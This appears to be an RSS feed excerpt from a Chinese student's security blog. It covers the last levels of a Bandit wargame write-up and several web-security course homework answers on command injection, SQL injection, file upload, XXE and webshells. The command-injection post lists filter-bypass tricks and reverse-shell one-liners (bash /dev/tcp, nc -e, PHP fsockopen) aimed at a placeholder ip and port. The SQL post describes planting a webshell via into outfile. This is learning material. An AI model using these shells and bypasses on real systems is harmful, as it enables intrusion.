	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172039929-1659318185_hu14789220198080620825.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172039929-1659318185_hu9260452076298108980.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;232&#34;
		data-flex-basis=&#34;558px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;仍然使用find指令，不过这次要在全局范围寻找：&lt;/p&gt;
&lt;p&gt;【find / -user bandit7 -group bandit6 -size 33c 2&amp;gt;/dev/null】&lt;/p&gt;
&lt;p&gt;-user用户&lt;/p&gt;
&lt;p&gt;-group 组&lt;/p&gt;
&lt;p&gt;2&amp;gt;/dev/null 是将所有的错误信息扔进黑洞。2是错误信息，如果回显到显示屏上会影响我们的寻找结果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172040336-153009074.png&#34;
	width=&#34;543&#34;
	height=&#34;126&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172040336-153009074_hu483162808551553541.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172040336-153009074_hu2332322930067440157.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;430&#34;
		data-flex-basis=&#34;1034px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;level-7--level-8&#34;&gt;Level 7 —— Level 8
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172040776-1092958082.png&#34;
	width=&#34;554&#34;
	height=&#34;132&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172040776-1092958082_hu5292000685610636164.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172040776-1092958082_hu13671379561760690043.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;419&#34;
		data-flex-basis=&#34;1007px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;接下来的密码藏在data.txt中，而这个密码在单词millionth旁边。&lt;/p&gt;
&lt;p&gt;如果我们直接打开data.txt，那么会看到铺天盖地的各种密码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172041467-1088801789.png&#34;
	width=&#34;360&#34;
	height=&#34;428&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172041467-1088801789_hu13855131893029334730.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172041467-1088801789_hu10104224653110846933.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;84&#34;
		data-flex-basis=&#34;201px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;跑上一会也不一定跑的完。&lt;/p&gt;
&lt;p&gt;所以这里明显是需要我们在文件中查找特定信息的指令。&lt;/p&gt;
&lt;p&gt;【grep】命令用来查找文件中符合条件的特定字符串&lt;/p&gt;
&lt;p&gt;| 管道符，可以将前面的正确输出做为后面的输入，需要注意的是后面只接受正确的输出。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172042067-1076073663.png&#34;
	width=&#34;353&#34;
	height=&#34;66&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172042067-1076073663_hu4871611287427771585.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172042067-1076073663_hu15781453256657671206.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;534&#34;
		data-flex-basis=&#34;1283px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;level-8-level-9&#34;&gt;Level 8—— Level 9
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172042536-553373246.png&#34;
	width=&#34;554&#34;
	height=&#34;150&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172042536-553373246_hu8046649305532256826.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172042536-553373246_hu8982874908573599218.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;369&#34;
		data-flex-basis=&#34;886px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;下一关的密码在data.txt中只出现一次的行中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172042983-1377440972.png&#34;
	width=&#34;554&#34;
	height=&#34;131&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172042983-1377440972_hu18269946359900162596.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172042983-1377440972_hu4220668587384550866.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;422&#34;
		data-flex-basis=&#34;1014px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172043407-91011967.png&#34;
	width=&#34;298&#34;
	height=&#34;134&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172043407-91011967_hu11877179942495127856.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172043407-91011967_hu16200542036925127942.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;222&#34;
		data-flex-basis=&#34;533px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;但是不能只用uniq命令，因为uniq命令是通过比较上下两行是否相同得出结果的。&lt;/p&gt;
&lt;p&gt;在使用uniq之前我们需要先用sort进行一次排序。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172043802-1528104041.png&#34;
	width=&#34;300&#34;
	height=&#34;56&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172043802-1528104041_hu15480461804379474612.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172043802-1528104041_hu14000433212947198849.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;535&#34;
		data-flex-basis=&#34;1285px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;level-9-level-10&#34;&gt;Level 9—— Level 10
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172044289-1653626373.png&#34;
	width=&#34;554&#34;
	height=&#34;167&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172044289-1653626373_hu2299542812379881159.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172044289-1653626373_hu1912921412569938833.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;331&#34;
		data-flex-basis=&#34;796px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;下一关的密码在data.txt中，但是是分散的，以&amp;quot;=&amp;ldquo;开头。&lt;/p&gt;
&lt;p&gt;直接打开data.txt是一堆乱码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172044810-2060549182.png&#34;
	width=&#34;554&#34;
	height=&#34;178&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172044810-2060549182_hu8483228049819956239.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172044810-2060549182_hu15786697244234111622.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;311&#34;
		data-flex-basis=&#34;746px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;参考网上资料，找到了strings这个神奇的指令，它主要用来提取和显示非文本文件中的文本字符串，比如在对象文件或二进制文件中查找可打印的字符串。&lt;/p&gt;
&lt;p&gt;通过组合cat和strings【cat data.txt | strings】，得到：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172045257-971161013.png&#34;
	width=&#34;340&#34;
	height=&#34;84&#34;
	srcset=&#34;https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172045257-971161013_hu15308519522089333278.png 480w, https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/1858293-20200405172045257-971161013_hu16046983769688829484.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;404&#34;
		data-flex-basis=&#34;971px&#34;
	
&gt;&lt;/p&gt;
&lt;h1 id=&#34;通过1-10能学到什么&#34;&gt;通过1-10能学到什么：
&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;学会XSS连接&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;最基本的cat打开文件指令，包括打开一些文件名很奇怪的文件（如以. – 开头，文件名中有空格等）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ls 和部分参数的使用&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;file 识别文件格式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;find 寻找特定的文件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;2&amp;gt;/dev/null 扔掉错误提示，知道了&amp;quot;黑洞&amp;quot;的存在&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;| 管道符的初步了解&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;grep 查找文件中符合条件的特定字符串&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sort 和 uniq 的初步使用，一个排序，一个查重&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;strings的奇妙使用&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>i春秋web作业2.28——命令注入</title>
        <link>https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.28%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/</link>
        <pubDate>Mon, 02 Mar 2020 02:58:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.28%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/</guid>
        <description>&lt;p&gt;Web安全工程师(入门班)&lt;/p&gt;
&lt;p&gt;【全国线上入门班53期】课后作业&lt;/p&gt;
&lt;p&gt;2020-2-28&lt;/p&gt;
&lt;p&gt;DorinXL&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;查资料都有哪些绕过命令注入过滤技巧？&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;1.黑名单绕过&lt;/p&gt;
&lt;p&gt;字符拼接：a=l;b=s;$a$b 输出ls&lt;/p&gt;
&lt;p&gt;2.空格绕过：&lt;/p&gt;
&lt;p&gt;​ &lt;br&gt;
        ${IFS}空格&lt;/p&gt;
&lt;p&gt;​ &lt;br&gt;
​ &lt;br&gt;
        \x20转化成字符串也是空格&lt;/p&gt;
&lt;p&gt;​ &lt;br&gt;
​ &lt;br&gt;
        重定向符&amp;lt;&amp;gt;&lt;/p&gt;
&lt;p&gt;3.编码绕过：&lt;/p&gt;
&lt;p&gt;输入echo MTIzCg==|base64 -d，将会打印123&lt;/p&gt;
&lt;p&gt;4.用单引号和双引号绕过：&lt;/p&gt;
&lt;p&gt;例如：ca&amp;rsquo;&amp;rsquo;t flag 或者是 ca&amp;quot;&amp;ldquo;t flag&lt;/p&gt;
&lt;p&gt;5.反斜杠绕过：&lt;/p&gt;
&lt;p&gt;例如：ca\t fl\ag&lt;/p&gt;
&lt;p&gt;6.绕过长度限制：&lt;/p&gt;
&lt;p&gt;linux下可以用 1&amp;gt;a创建文件名为a的空文件，ls -t&amp;gt;test则会将目录按时间排序后写进test文件中，sh命令可以从一个文件中读取命令来执行&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;检测命令注入漏洞时没有回显怎么办？&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;利用延时命令查看响应速度或者请求服务器查看是否接收到请求。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;延时注入：windows：ping 127.0.0.1 -n 5 &amp;gt;nul&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Linux : sleep 5&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;远程请求：windows : ping,telnet等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Linux : wget,curl等&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;怎么通过命令注入漏洞反弹shell？&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;pre&gt;&lt;code&gt;**Bash方式** ： $ bash -c &amp;quot;sh &amp;gt;&amp;amp; /dev/tcp/your ip/port 0&amp;gt;&amp;amp;1&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;exec方式&lt;/strong&gt; ： $ exec 5&amp;lt;&amp;gt;/dev/tcp/ip/port&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;nc方式&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;本机运行:&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;nc -l -vv -p port&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;目标主机:&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;nc -e /bin/bash ip port&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;php方式&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;php -r &amp;lsquo;$sock=fsockopen(&amp;ldquo;ip&amp;rdquo;,port);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;rdquo;);&amp;rsquo;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>i春秋web作业2.27——SQL注入</title>
        <link>https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.27sql%E6%B3%A8%E5%85%A5/</link>
        <pubDate>Mon, 02 Mar 2020 02:57:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.27sql%E6%B3%A8%E5%85%A5/</guid>
        <description>&lt;p&gt;Web安全工程师(入门班)&lt;/p&gt;
&lt;p&gt;【全国线上入门班53期】课后作业&lt;/p&gt;
&lt;p&gt;2020-2-27&lt;/p&gt;
&lt;p&gt;DorinXL&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1）思考SQL注入采用什么方法植入WebShell？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;可以在表中保存木马数据，然后导出库保存文件，删除新建的表。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;拥有写入权限时，选择select … into outfile 语句：select A into outfile B，意思是选择a的数据导入b。通过与其他联合语句将shell写入，但是要知道路径。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;2) SQL注入能否查看文件？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;SQL注入可以查看文件，但是有前提条件。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;要知道文件的路径，要拥有读写权限，然后通过构造合适的语句来达到查看文件的目的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用&lt;strong&gt;load_file函数&lt;/strong&gt; 读取&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;3）思考SQL注入盲注的原理以及利用方法&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;无法根据报错信息来进行注入判断的情况，称之为盲注。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;盲注通过逻辑真假以及是否有返回来判断漏洞存在，然后便是猜测表名、用户名等数据。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>i春秋web作业2.26——文件上传</title>
        <link>https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.26%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link>
        <pubDate>Fri, 28 Feb 2020 03:19:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.26%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</guid>
        <description>&lt;p&gt;Web安全工程师(入门班)&lt;/p&gt;
&lt;p&gt;【全国线上入门班53期】课后作业&lt;/p&gt;
&lt;p&gt;2020-2-26&lt;/p&gt;
&lt;p&gt;DorinXL&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1）为什么说js校验是一种不安全的校验方式？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;js校验不安全，是因为用户很容易通过控制台删除或是禁用js从而达到绕过校验的目的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;但是客户端的校验速度快，js可以提升用户体验，同时可以减轻服务器的压力。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;虽然js并不安全，但是为了保障用户体验还是有存在的必要。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;所以为了保障起见，客户端的js校验和服务端的二次校验都应存在。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;2)Apache解析漏洞如何利用呢？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;低版本的Apache认为，一个文件可以有多个后缀。如果有必要，Apache会从右往左，一一辨别后缀。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;当Apache不认识某个后缀时，如某文件名为：warma.mp3.html.qwe.abc，Apache在处理时，先读取最后一个后缀，为&amp;quot;.abc&amp;quot;，不认识，继续读取下一个后缀&amp;quot;.qwe&amp;quot;，还是不认识，继续读下一个后缀&amp;quot;.html&amp;quot;，认出之后会当作超文本标记语言文件进行执行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可以通过Apache的这种特性来绕过黑名单校验。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>i春秋web作业2.25——WebShell</title>
        <link>https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/</link>
        <pubDate>Tue, 25 Feb 2020 15:03:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/</guid>
        <description>&lt;p&gt;Web安全工程师(入门班)&lt;/p&gt;
&lt;p&gt;【全国线上入门班53期】课后作业&lt;/p&gt;
&lt;p&gt;2020-2-25&lt;/p&gt;
&lt;p&gt;DorinXL&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;请思考：XXE漏洞的原理的是什么？有哪些危害？&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;XXE漏洞全称&lt;strong&gt;XML External Entity Injection&lt;/strong&gt; ，即xml外部实体注入漏洞。实在应用程序加载xml文件的时候，因为没有禁止外部实体的加载，导致可能加载上恶意文件或代码。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;XXE的危害包括但不限于任意&lt;strong&gt;文件读取&lt;/strong&gt; 、&lt;strong&gt;端口扫描&lt;/strong&gt; 、&lt;strong&gt;Dos攻击&lt;/strong&gt; 等。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果想要防御XXE攻击，最直接的办法就是禁止xml中包含自有的DTD，从而达到一种过滤的效果。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;2）寻找OWASP 近年漏洞的排名变化，思考未来哪些方面会成为Web应用主要安全威胁？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;根据往期top10的排名，个人认为注入威胁或将继续大范围存在。几乎所有的数据源都可以成为注入点，虽然注入漏洞可以很容易的被扫描器或其它工具发现，但想要做到近乎完美的严格过滤很困难。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;安全配置错误、不足的日志记录和监控，这些威胁我认为建设者和防御者要承担一部分责任，属于设计上的漏洞。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用包含已知漏洞的组件这一项虽然不会大面积增长，但却可能持续存在，打个补丁能解决的问题，往往会像牛皮糖一样死缠烂打，一环扣一环的进行下去。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;新增加的风险类型XXE或许将淡出视线。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;3）请思考：都有哪些PHP函数可以替代eval？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;eval() 函数把字符串按照 PHP 代码来执行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;pre&gt;&lt;code&gt;system不能替代eval，https://www.cnblogs.com/xiaozi/p/7834367.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;4）请使用中国菜刀对网站数据库进行管理操作。&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;实验条件有提示了，那我们注册好进入上传的页面，审计代码后f12删除检查函数：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230242056-1353749287.png&#34;
	width=&#34;436&#34;
	height=&#34;168&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230242056-1353749287_hu1800449087676201041.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230242056-1353749287_hu9102365828850696074.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;259&#34;
		data-flex-basis=&#34;622px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;写好一句话木马：&lt;img src=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230242509-1830710713.png&#34;
	width=&#34;288&#34;
	height=&#34;118&#34;
	srcset=&#34;https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230242509-1830710713_hu12389165315161580551.png 480w, https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/1858293-20200225230242509-1830710713_hu1021066435697901648.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;244&#34;
		data-flex-basis=&#34;585px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
